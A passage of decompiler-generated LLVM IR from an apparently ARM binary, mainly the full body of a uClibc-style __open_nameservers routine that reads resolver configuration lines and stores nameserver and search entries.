dec_label_pc_10aa8:
  %v0_10aa8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10aa8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_10aa8
  %v5_10aa8 = mul i32 %arg2, 256
  %v6_10aa8 = and i32 %v5_10aa8, %arg1
  %v3_10aac = load i32, i32* @lr, align 4
  %v8_10aac = lshr i32 %v6_10aa8, %v3_10aac
  %v9_10aac = and i32 %v8_10aac, %arg2
  call void @__pseudo_branch(i32 %v9_10aac)
  %v0_10ad8.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10ad8.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_10aa8, %bb
  %v10_10ad8 = phi i32 [ %arg1, %dec_label_pc_10aa8 ], [ %v6_10aa8, %bb ], [ %v6_10aa8, %.thread ]
  ret i32 %v10_10ad8

; uselistorder directives
  uselistorder i32 %v6_10aa8, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10adc = load i32, i32* @r4, align 4
  store i32 %v3_10adc, i32* %stack_var_-28, align 4
  %v6_10adc = load i32, i32* @r5, align 4
  %v9_10adc = load i32, i32* @r6, align 4
  %v12_10adc = load i32, i32* @r7, align 4
  %v15_10adc = load i32, i32* @r8, align 4
  %v18_10adc = load i32, i32* @sl, align 4
  %v2_10ae0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_10ae4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10ae4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d7b4.525 to i32), i32* %r2.global-to-local, align 4
  %v1_10af8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1d7b4.525 to i32), i32* %r0.global-to-local, align 4
  store i32 68364, i32* @lr, align 4
  %v1_10b08 = call i32 @__pthread_return_0()
  store i32 %v1_10b08, i32* %r0.global-to-local, align 4
  %v2_10b10 = load i32, i32* @global_var_1feac.530, align 4
  %v5_10b18 = icmp sgt i32 %v2_10b10, 0
  br i1 %v5_10b18, label %dec_label_pc_10d54, label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_149cc.706 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_149e0.708 to i32), i32* @r1, align 4
  %v3_10b24 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_149cc.706 to i32), i32 ptrtoint (i32* @global_var_149e0.708 to i32))
  store i32 %v3_10b24, i32* %r0.global-to-local, align 4
  store i32 %v3_10b24, i32* @sl, align 4
  %v2_10b28 = icmp eq i32 %v3_10b24, 0
  br i1 %v2_10b28, label %dec_label_pc_10b30, label %dec_label_pc_10d1c.preheader

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10b1c
  store i32 ptrtoint ([24 x i8]* @global_var_149e4.710 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_149e0.708 to i32), i32* @r1, align 4
  %v3_10b38 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_149e4.710 to i32), i32 ptrtoint (i32* @global_var_149e0.708 to i32))
  store i32 %v3_10b38, i32* %r0.global-to-local, align 4
  store i32 %v3_10b38, i32* @sl, align 4
  %v2_10b3c = icmp eq i32 %v3_10b38, 0
  br i1 %v2_10b3c, label %dec_label_pc_10d48, label %dec_label_pc_10d1c.preheader

dec_label_pc_10d1c.preheader:                     ; preds = %dec_label_pc_10b1c, %dec_label_pc_10b30
  %v0_10d2426 = phi i32 [ %v3_10b24, %dec_label_pc_10b1c ], [ %v3_10b38, %dec_label_pc_10b30 ]
  %v2_10b90 = ptrtoint i32* %stack_var_-28 to i32
  %v3_10c2c = inttoptr i32 %tmp to i8*
  store i32 %v2_10ae0, i32* %r0.global-to-local, align 4
  store i32 %v0_10d2426, i32* %r2.global-to-local, align 4
  %v3_10d2866 = call i32 @fgets(i32 %v2_10ae0, i32 128, i32 %v0_10d2426)
  store i32 %v3_10d2866, i32* %r0.global-to-local, align 4
  %v2_10d2c68 = icmp eq i32 %v3_10d2866, 0
  store i32 %v2_10ae0, i32* @r4, align 4
  br i1 %v2_10d2c68, label %dec_label_pc_10d3c, label %dec_label_pc_10b4c.preheader.lr.ph

dec_label_pc_10b4c.preheader.lr.ph:               ; preds = %dec_label_pc_10d1c.preheader
  %v1_10b4c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_10b4c.preheader

dec_label_pc_10b48:                               ; preds = %dec_label_pc_10b58
  %v1_10b48 = add i32 %v0_10b48, 1
  store i32 %v1_10b48, i32* %r0.global-to-local, align 4
  %v1_10b4c = inttoptr i32 %v1_10b48 to i8*
  %v2_10b4c = load i8, i8* %v1_10b4c, align 1
  %v3_10b4c = zext i8 %v2_10b4c to i32
  store i32 %v3_10b4c, i32* %r2.global-to-local, align 4
  %v2_10b50 = icmp eq i8 %v2_10b4c, 0
  br i1 %v2_10b50, label %dec_label_pc_10b6c, label %dec_label_pc_10b58

dec_label_pc_10b58:                               ; preds = %dec_label_pc_10b58.lr.ph, %dec_label_pc_10b48
  %v0_10b48 = phi i32 [ %v2_10ae0, %dec_label_pc_10b58.lr.ph ], [ %v1_10b48, %dec_label_pc_10b48 ]
  %v1_10b60 = phi i32 [ %v3_10b4c13, %dec_label_pc_10b58.lr.ph ], [ %v3_10b4c, %dec_label_pc_10b48 ]
  %v3_10b60 = mul nuw nsw i32 %v1_10b60, 2
  %v4_10b60 = add i32 %v3_10b60, %v2_10b5c.pre
  %v5_10b60 = inttoptr i32 %v4_10b60 to i8*
  %v6_10b60 = load i8, i8* %v5_10b60, align 1
  %v1_10b64 = and i8 %v6_10b60, 32
  %v2_10b64 = icmp eq i8 %v1_10b64, 0
  br i1 %v2_10b64, label %dec_label_pc_10b6c, label %dec_label_pc_10b48

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b48, %dec_label_pc_10b58, %dec_label_pc_10b4c.preheader
  %v0_10c0435 = phi i32 [ %v2_10ae0, %dec_label_pc_10b4c.preheader ], [ %v1_10b48, %dec_label_pc_10b48 ], [ %v0_10b48, %dec_label_pc_10b58 ]
  %v0_10b80 = phi i32 [ %v3_10b4c13, %dec_label_pc_10b4c.preheader ], [ %v3_10b4c, %dec_label_pc_10b48 ], [ %v1_10b60, %dec_label_pc_10b58 ]
  %v7_10b6c = icmp eq i32 %v0_10b80, 10
  br i1 %v7_10b6c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_10b6c
  %v3_10b70 = icmp eq i32 %v0_10b80, 0
  br i1 %v3_10b70, label %bb55, label %dec_label_pc_10b80

.thread3:                                         ; preds = %dec_label_pc_10b6c
  br label %dec_label_pc_10d1c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_10d1c.backedge

dec_label_pc_10d1c.backedge:                      ; preds = %dec_label_pc_10cf8, %dec_label_pc_10d10, %bb55, %dec_label_pc_10c90, %.thread3, %dec_label_pc_10b80
  %v0_10d24.pre = load i32, i32* @sl, align 4
  store i32 %v2_10ae0, i32* %r0.global-to-local, align 4
  store i32 %v0_10d24.pre, i32* %r2.global-to-local, align 4
  %v3_10d28 = call i32 @fgets(i32 %v2_10ae0, i32 128, i32 %v0_10d24.pre)
  store i32 %v3_10d28, i32* %r0.global-to-local, align 4
  %v2_10d2c = icmp eq i32 %v3_10d28, 0
  store i32 %v2_10ae0, i32* @r4, align 4
  br i1 %v2_10d2c, label %dec_label_pc_10d3c, label %dec_label_pc_10b4c.preheader

dec_label_pc_10b80:                               ; preds = %bb
  %v7_10b80 = icmp eq i32 %v0_10b80, 35
  br i1 %v7_10b80, label %dec_label_pc_10d1c.backedge, label %dec_label_pc_10c04

dec_label_pc_10b90:                               ; preds = %bb58
  store i32 %v2_10b90, i32* %r2.global-to-local, align 4
  %v4_10b94 = mul i32 %storemerge, 4
  %v5_10b94 = add i32 %v4_10b94, %v2_10b90
  %v2_10b98 = add i32 %v5_10b94, -36
  %v3_10b98 = inttoptr i32 %v2_10b98 to i32*
  store i32 %v0_10b98, i32* %v3_10b98, align 4
  %v0_10ba415 = load i32, i32* %r0.global-to-local, align 4
  %v1_10ba416 = inttoptr i32 %v0_10ba415 to i8*
  %v2_10ba417 = load i8, i8* %v1_10ba416, align 1
  %v3_10ba418 = zext i8 %v2_10ba417 to i32
  store i32 %v3_10ba418, i32* %r2.global-to-local, align 4
  %v2_10ba819 = icmp eq i8 %v2_10ba417, 0
  br i1 %v2_10ba819, label %dec_label_pc_10bd8.preheader, label %dec_label_pc_10bb0.lr.ph

dec_label_pc_10bb0.lr.ph:                         ; preds = %dec_label_pc_10b90
  %v2_10bb4.pre = load i32, i32* @global_var_1d7a4, align 4
  br label %dec_label_pc_10bb0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10bc4
  %v1_10ba0 = add i32 %v0_10ba0, 1
  store i32 %v1_10ba0, i32* %r0.global-to-local, align 4
  %v1_10ba4 = inttoptr i32 %v1_10ba0 to i8*
  %v2_10ba4 = load i8, i8* %v1_10ba4, align 1
  %v3_10ba4 = zext i8 %v2_10ba4 to i32
  store i32 %v3_10ba4, i32* %r2.global-to-local, align 4
  %v2_10ba8 = icmp eq i8 %v2_10ba4, 0
  br i1 %v2_10ba8, label %dec_label_pc_10bd8.preheader, label %dec_label_pc_10bb0

dec_label_pc_10bb0:                               ; preds = %dec_label_pc_10bb0.lr.ph, %dec_label_pc_10ba0
  %v0_10ba0 = phi i32 [ %v0_10ba415, %dec_label_pc_10bb0.lr.ph ], [ %v1_10ba0, %dec_label_pc_10ba0 ]
  %v0_10bc4 = phi i32 [ %v3_10ba418, %dec_label_pc_10bb0.lr.ph ], [ %v3_10ba4, %dec_label_pc_10ba0 ]
  %v3_10bb8 = mul nuw nsw i32 %v0_10bc4, 2
  %v4_10bb8 = add i32 %v3_10bb8, %v2_10bb4.pre
  %v5_10bb8 = inttoptr i32 %v4_10bb8 to i8*
  %v6_10bb8 = load i8, i8* %v5_10bb8, align 1
  %v1_10bbc = and i8 %v6_10bb8, 32
  %v2_10bbc = icmp eq i8 %v1_10bbc, 0
  br i1 %v2_10bbc, label %dec_label_pc_10bc4, label %dec_label_pc_10bd8.preheader

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10bb0
  %v7_10bc4 = icmp eq i32 %v0_10bc4, 10
  br i1 %v7_10bc4, label %dec_label_pc_10bd8.preheader, label %dec_label_pc_10ba0

dec_label_pc_10bd8.preheader:                     ; preds = %dec_label_pc_10bc4, %dec_label_pc_10bb0, %dec_label_pc_10ba0, %dec_label_pc_10b90
  %v0_10bd820 = phi i32 [ %v0_10ba415, %dec_label_pc_10b90 ], [ %v0_10ba0, %dec_label_pc_10bc4 ], [ %v0_10ba0, %dec_label_pc_10bb0 ], [ %v1_10ba0, %dec_label_pc_10ba0 ]
  %v1_10bd821 = inttoptr i32 %v0_10bd820 to i8*
  %v2_10bd822 = load i8, i8* %v1_10bd821, align 1
  %v3_10bd823 = zext i8 %v2_10bd822 to i32
  store i32 %v3_10bd823, i32* %r2.global-to-local, align 4
  %v2_10bdc24 = icmp eq i8 %v2_10bd822, 0
  br i1 %v2_10bdc24, label %dec_label_pc_10c00, label %dec_label_pc_10be4

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10be4, %dec_label_pc_10bf8
  %v3_10bd4 = inttoptr i32 %v2_10bd4 to i8*
  store i8 0, i8* %v3_10bd4, align 1
  %v4_10bd4 = load i32, i32* %r0.global-to-local, align 4
  %v5_10bd4 = add i32 %v4_10bd4, 1
  store i32 %v5_10bd4, i32* %r0.global-to-local, align 4
  %v1_10bd8 = inttoptr i32 %v5_10bd4 to i8*
  %v2_10bd8 = load i8, i8* %v1_10bd8, align 1
  %v3_10bd8 = zext i8 %v2_10bd8 to i32
  store i32 %v3_10bd8, i32* %r2.global-to-local, align 4
  %v2_10bdc = icmp eq i8 %v2_10bd8, 0
  br i1 %v2_10bdc, label %dec_label_pc_10c00, label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10bd8.preheader, %dec_label_pc_10bd0
  %v0_10bf8 = phi i32 [ %v3_10bd8, %dec_label_pc_10bd0 ], [ %v3_10bd823, %dec_label_pc_10bd8.preheader ]
  %v2_10bd4 = phi i32 [ %v5_10bd4, %dec_label_pc_10bd0 ], [ %v0_10bd820, %dec_label_pc_10bd8.preheader ]
  %v2_10be8 = load i32, i32* @global_var_1d7a4, align 4
  %v3_10bec = mul nuw nsw i32 %v0_10bf8, 2
  %v4_10bec = add i32 %v2_10be8, %v3_10bec
  %v5_10bec = inttoptr i32 %v4_10bec to i8*
  %v6_10bec = load i8, i8* %v5_10bec, align 1
  %v1_10bf0 = and i8 %v6_10bec, 32
  %v2_10bf0 = icmp eq i8 %v1_10bf0, 0
  br i1 %v2_10bf0, label %dec_label_pc_10bf8, label %dec_label_pc_10bd0

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10be4
  %v7_10bf8 = icmp eq i32 %v0_10bf8, 10
  br i1 %v7_10bf8, label %dec_label_pc_10bd0, label %dec_label_pc_10c00

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bd0, %dec_label_pc_10bf8, %dec_label_pc_10bd8.preheader
  %v0_10c0434 = phi i32 [ %v0_10bd820, %dec_label_pc_10bd8.preheader ], [ %v5_10bd4, %dec_label_pc_10bd0 ], [ %v2_10bd4, %dec_label_pc_10bf8 ]
  %v0_10c00 = load i32, i32* @r8, align 4
  %v1_10c00 = add i32 %v0_10c00, 1
  br label %dec_label_pc_10c04

dec_label_pc_10c04:                               ; preds = %dec_label_pc_10b80, %dec_label_pc_10c00
  %storemerge = phi i32 [ %v1_10c00, %dec_label_pc_10c00 ], [ 0, %dec_label_pc_10b80 ]
  %v0_10b98 = phi i32 [ %v0_10c0434, %dec_label_pc_10c00 ], [ %v0_10c0435, %dec_label_pc_10b80 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_10c04 = inttoptr i32 %v0_10b98 to i8*
  %v2_10c04 = load i8, i8* %v1_10c04, align 1
  %v3_10c04 = zext i8 %v2_10c04 to i32
  %v2_10c08 = icmp eq i8 %v2_10c04, 0
  br i1 %v2_10c08, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_10c04
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_10c04, %bb56
  %v0_10c18.pr = phi i32 [ %v3_10c04, %dec_label_pc_10c04 ], [ 1, %bb56 ]
  %v1_10c10 = add i32 %storemerge, -4
  %v3_10c10 = sub i32 3, %storemerge
  %v4_10c10 = and i32 %v3_10c10, %storemerge
  %v5_10c10 = icmp slt i32 %v4_10c10, 0
  %v6_10c10 = icmp slt i32 %v1_10c10, 0
  %v7_10c10 = icmp eq i32 %storemerge, 4
  %v3_10c14 = xor i1 %v6_10c10, %v5_10c10
  %v4_10c14 = or i1 %v7_10c10, %v3_10c14
  br i1 %v4_10c14, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_10c20

bb58:                                             ; preds = %bb57
  %v2_10c18 = icmp eq i32 %v0_10c18.pr, 0
  br i1 %v2_10c18, label %dec_label_pc_10c20, label %dec_label_pc_10b90

dec_label_pc_10c20:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_149fc.713 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_10c2c = call i32 @__GI_strcoll(i8* %v3_10c2c, i32 ptrtoint ([11 x i8]* @global_var_149fc.713 to i32))
  store i32 %v4_10c2c, i32* %r0.global-to-local, align 4
  %v2_10c30 = icmp eq i32 %v4_10c2c, 0
  br i1 %v2_10c30, label %dec_label_pc_10c58.preheader, label %dec_label_pc_10c7c

dec_label_pc_10c58.preheader:                     ; preds = %dec_label_pc_10c20
  br label %dec_label_pc_10c58

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c70
  %v1_10c40 = add i32 %v5_10c60, -36
  %v2_10c40 = inttoptr i32 %v1_10c40 to i32*
  %v3_10c40 = load i32, i32* %v2_10c40, align 4
  store i32 %v3_10c40, i32* %r0.global-to-local, align 4
  %v1_10c44 = inttoptr i32 %v3_10c40 to i8*
  %v2_10c44 = call i32 @__GI_strdup(i8* %v1_10c44)
  store i32 %v2_10c44, i32* %r0.global-to-local, align 4
  %v0_10c4c = load i32, i32* @r4, align 4
  %v1_10c4c = add i32 %v0_10c4c, 1
  store i32 %v1_10c4c, i32* %r2.global-to-local, align 4
  %v5_10c50 = mul i32 %v0_10c4c, 4
  %v6_10c50 = add i32 %v5_10c50, ptrtoint (i32* @global_var_1fea0.533 to i32)
  %v7_10c50 = inttoptr i32 %v6_10c50 to i32*
  store i32 %v2_10c44, i32* %v7_10c50, align 4
  %v0_10c54 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c54 = load i32, i32* @r7, align 4
  %v2_10c54 = inttoptr i32 %v1_10c54 to i32*
  store i32 %v0_10c54, i32* %v2_10c54, align 4
  %v0_10c5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10c58

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c58.preheader, %dec_label_pc_10c40
  %v0_10c68 = phi i32 [ 1, %dec_label_pc_10c58.preheader ], [ %v0_10c5c.pre, %dec_label_pc_10c40 ]
  store i32 %v2_10b90, i32* %r2.global-to-local, align 4
  %v1_10c5c = load i32, i32* @r8, align 4
  %v2_10c5c = sub i32 %v0_10c68, %v1_10c5c
  %v4_10c5c = xor i32 %v1_10c5c, %v0_10c68
  %v5_10c5c = xor i32 %v2_10c5c, %v0_10c68
  %v6_10c5c = and i32 %v5_10c5c, %v4_10c5c
  %v7_10c5c = icmp slt i32 %v6_10c5c, 0
  %v8_10c5c = icmp slt i32 %v2_10c5c, 0
  %v4_10c60 = mul i32 %v0_10c68, 4
  %v5_10c60 = add i32 %v4_10c60, %v2_10b90
  store i32 ptrtoint (i32* @global_var_1feac.530 to i32), i32* @r7, align 4
  %v1_10c68 = add i32 %v0_10c68, 1
  store i32 %v1_10c68, i32* @r5, align 4
  %v2_10c6c = xor i1 %v8_10c5c, %v7_10c5c
  br i1 %v2_10c6c, label %dec_label_pc_10c70, label %dec_label_pc_10c7c

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c58
  %v2_10c70 = load i32, i32* @global_var_1feac.530, align 4
  store i32 %v2_10c70, i32* @r4, align 4
  %v7_10c78 = icmp slt i32 %v2_10c70, 3
  br i1 %v7_10c78, label %dec_label_pc_10c40, label %dec_label_pc_10c7c

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c58, %dec_label_pc_10c70, %dec_label_pc_10c20
  %v0_10c7c = load i32, i32* @r6, align 4
  store i32 %v0_10c7c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_14a08.716 to i32), i32* @r1, align 4
  %v3_10c84 = inttoptr i32 %v0_10c7c to i8*
  %v4_10c84 = call i32 @__GI_strcoll(i8* %v3_10c84, i32 ptrtoint ([7 x i8]* @global_var_14a08.716 to i32))
  store i32 %v4_10c84, i32* %r0.global-to-local, align 4
  %v2_10c88 = icmp eq i32 %v4_10c84, 0
  br i1 %v2_10c88, label %dec_label_pc_10cc0.preheader, label %dec_label_pc_10c90

dec_label_pc_10c90:                               ; preds = %dec_label_pc_10c7c
  %v0_10c90 = load i32, i32* @r6, align 4
  store i32 %v0_10c90, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_14a10.718 to i32), i32* @r1, align 4
  %v3_10c98 = inttoptr i32 %v0_10c90 to i8*
  %v4_10c98 = call i32 @__GI_strcoll(i8* %v3_10c98, i32 ptrtoint ([7 x i8]* @global_var_14a10.718 to i32))
  store i32 %v4_10c98, i32* %r0.global-to-local, align 4
  %v2_10c9c = icmp eq i32 %v4_10c98, 0
  br i1 %v2_10c9c, label %dec_label_pc_10cc0.preheader, label %dec_label_pc_10d1c.backedge

dec_label_pc_10cc0.preheader:                     ; preds = %dec_label_pc_10c7c, %dec_label_pc_10c90
  store i32 ptrtoint (i32* @global_var_1feb0.693 to i32), i32* @r4, align 4
  %v2_10cc460 = load i32, i32* @global_var_1feb0.693, align 4
  store i32 ptrtoint (i32* @global_var_1fe90.697 to i32), i32* @r5, align 4
  %v1_10cd063 = add i32 %v2_10cc460, -1
  store i32 %v1_10cd063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_10cc460, 1
  br i1 %tmp5964, label %dec_label_pc_10cd8, label %dec_label_pc_10ca8

dec_label_pc_10ca8:                               ; preds = %dec_label_pc_10cc0.preheader, %dec_label_pc_10ca8
  %v1_10cd065 = phi i32 [ %v1_10cd0, %dec_label_pc_10ca8 ], [ %v1_10cd063, %dec_label_pc_10cc0.preheader ]
  %v4_10ca8 = mul i32 %v1_10cd065, 4
  %v5_10ca8 = add i32 %v4_10ca8, ptrtoint (i32* @global_var_1fe90.697 to i32)
  %v6_10ca8 = inttoptr i32 %v5_10ca8 to i32*
  %v7_10ca8 = load i32, i32* %v6_10ca8, align 4
  store i32 %v7_10ca8, i32* @r0, align 4
  store i32 %v1_10cd065, i32* @global_var_1feb0.693, align 4
  %v0_10cb0 = call i32 @free()
  store i32 %v0_10cb0, i32* %r0.global-to-local, align 4
  %v0_10cb4 = load i32, i32* @r4, align 4
  %v1_10cb4 = inttoptr i32 %v0_10cb4 to i32*
  %v2_10cb4 = load i32, i32* %v1_10cb4, align 4
  %v1_10cbc = load i32, i32* @r5, align 4
  %v5_10cbc = mul i32 %v2_10cb4, 4
  %v6_10cbc = add i32 %v1_10cbc, %v5_10cbc
  %v7_10cbc = inttoptr i32 %v6_10cbc to i32*
  store i32 0, i32* %v7_10cbc, align 4
  store i32 ptrtoint (i32* @global_var_1feb0.693 to i32), i32* @r4, align 4
  %v2_10cc4 = load i32, i32* @global_var_1feb0.693, align 4
  store i32 ptrtoint (i32* @global_var_1fe90.697 to i32), i32* @r5, align 4
  %v1_10cd0 = add i32 %v2_10cc4, -1
  store i32 %v1_10cd0, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_10cc4, 1
  br i1 %tmp59, label %dec_label_pc_10cd8, label %dec_label_pc_10ca8

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10ca8, %dec_label_pc_10cc0.preheader
  br label %dec_label_pc_10cf8

dec_label_pc_10ce0:                               ; preds = %dec_label_pc_10d10
  %v1_10ce0 = add i32 %v5_10d00, -36
  %v2_10ce0 = inttoptr i32 %v1_10ce0 to i32*
  %v3_10ce0 = load i32, i32* %v2_10ce0, align 4
  store i32 %v3_10ce0, i32* %r0.global-to-local, align 4
  %v1_10ce4 = inttoptr i32 %v3_10ce0 to i8*
  %v2_10ce4 = call i32 @__GI_strdup(i8* %v1_10ce4)
  store i32 %v2_10ce4, i32* %r0.global-to-local, align 4
  %v0_10cec = load i32, i32* @r4, align 4
  %v1_10cec = add i32 %v0_10cec, 1
  store i32 %v1_10cec, i32* %r2.global-to-local, align 4
  %v5_10cf0 = mul i32 %v0_10cec, 4
  %v6_10cf0 = add i32 %v5_10cf0, ptrtoint (i32* @global_var_1fe90.697 to i32)
  %v7_10cf0 = inttoptr i32 %v6_10cf0 to i32*
  store i32 %v2_10ce4, i32* %v7_10cf0, align 4
  %v0_10cf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10cf4 = load i32, i32* @r6, align 4
  %v2_10cf4 = inttoptr i32 %v1_10cf4 to i32*
  store i32 %v0_10cf4, i32* %v2_10cf4, align 4
  %v0_10cfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10cf8

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10cd8, %dec_label_pc_10ce0
  %v0_10d08 = phi i32 [ 1, %dec_label_pc_10cd8 ], [ %v0_10cfc.pre, %dec_label_pc_10ce0 ]
  store i32 %v2_10b90, i32* %r2.global-to-local, align 4
  %v1_10cfc = load i32, i32* @r8, align 4
  %v2_10cfc = sub i32 %v0_10d08, %v1_10cfc
  %v4_10cfc = xor i32 %v1_10cfc, %v0_10d08
  %v5_10cfc = xor i32 %v2_10cfc, %v0_10d08
  %v6_10cfc = and i32 %v5_10cfc, %v4_10cfc
  %v7_10cfc = icmp slt i32 %v6_10cfc, 0
  %v8_10cfc = icmp slt i32 %v2_10cfc, 0
  %v4_10d00 = mul i32 %v0_10d08, 4
  %v5_10d00 = add i32 %v4_10d00, %v2_10b90
  store i32 ptrtoint (i32* @global_var_1feb0.693 to i32), i32* @r6, align 4
  %v1_10d08 = add i32 %v0_10d08, 1
  store i32 %v1_10d08, i32* @r5, align 4
  %v2_10d0c = xor i1 %v8_10cfc, %v7_10cfc
  br i1 %v2_10d0c, label %dec_label_pc_10d10, label %dec_label_pc_10d1c.backedge

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10cf8
  %v2_10d10 = load i32, i32* @global_var_1feb0.693, align 4
  store i32 %v2_10d10, i32* @r4, align 4
  %v7_10d18 = icmp slt i32 %v2_10d10, 4
  br i1 %v7_10d18, label %dec_label_pc_10ce0, label %dec_label_pc_10d1c.backedge

dec_label_pc_10b4c.preheader:                     ; preds = %dec_label_pc_10b4c.preheader.lr.ph, %dec_label_pc_10d1c.backedge
  store i32 %v2_10ae0, i32* %r0.global-to-local, align 4
  %v2_10b4c12 = load i8, i8* %v1_10b4c11, align 4
  %v3_10b4c13 = zext i8 %v2_10b4c12 to i32
  store i32 %v3_10b4c13, i32* %r2.global-to-local, align 4
  %v2_10b5014 = icmp eq i8 %v2_10b4c12, 0
  br i1 %v2_10b5014, label %dec_label_pc_10b6c, label %dec_label_pc_10b58.lr.ph

dec_label_pc_10b58.lr.ph:                         ; preds = %dec_label_pc_10b4c.preheader
  %v2_10b5c.pre = load i32, i32* @global_var_1d7a4, align 4
  br label %dec_label_pc_10b58

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d1c.backedge, %dec_label_pc_10d1c.preheader
  %v0_10d3c = load i32, i32* @sl, align 4
  store i32 %v0_10d3c, i32* %r0.global-to-local, align 4
  %v1_10d40 = inttoptr i32 %v0_10d3c to i8*
  %v2_10d40 = call i32 @__GI_fclose(i8* %v1_10d40)
  store i32 %v2_10d40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d54

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10b30
  %v0_10d48 = call i32 @__GI___h_errno_location()
  store i32 %v0_10d48, i32* %r0.global-to-local, align 4
  %v2_10d50 = inttoptr i32 %v0_10d48 to i32*
  store i32 3, i32* %v2_10d50, align 4
  br label %dec_label_pc_10d54

dec_label_pc_10d54:                               ; preds = %entry, %dec_label_pc_10d3c, %dec_label_pc_10d48
  store i32 %v2_10ae4, i32* @r0, align 4
  %v1_10d64 = call i32 @__pthread_return_void()
  store i32 %v1_10d64, i32* %r0.global-to-local, align 4
  store i32 %v6_10adc, i32* @r5, align 4
  store i32 %v9_10adc, i32* @r6, align 4
  store i32 %v12_10adc, i32* @r7, align 4
  store i32 %v15_10adc, i32* @r8, align 4
  store i32 %v18_10adc, i32* @sl, align 4
  ret i32 %v1_10d64

; uselistorder directives
  uselistorder i32 %v3_10b4c13, { 2, 1, 0 }
  uselistorder i32 %v2_10cfc, { 1, 0 }
  uselistorder i32 %v0_10d08, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_10cd0, { 1, 0 }
  uselistorder i32 %v1_10cd065, { 1, 0 }
  uselistorder i32 %v2_10c5c, { 1, 0 }
  uselistorder i32 %v0_10c68, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_10b98, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_10bd820, { 1, 0, 2 }
  uselistorder i32 %v2_10b90, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_10ae0, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 1, 2, 4, 0, 7, 5, 6, 8, 15, 9, 14, 10, 16, 12, 11, 17 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 5, 4, 21, 7, 6, 8, 10, 9, 12, 11, 14, 13, 22, 15, 16, 20, 17, 19, 24, 23, 18, 2, 28, 25, 27, 1, 26 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 12, 10, 9, 8, 7, 6, 5, 19, 18, 4, 3, 2, 1, 0, 11, 17, 16, 15, 14, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_1fe90.697 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_1feb0.693, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_1feb0.693 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1fea0.533 to i32), { 1, 0, 2 }
